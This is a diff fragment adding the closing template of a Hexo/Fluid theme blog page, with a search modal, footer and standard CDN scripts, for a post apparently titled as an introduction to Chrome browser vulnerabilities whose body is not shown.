+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Chrome浏览器漏洞入门&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
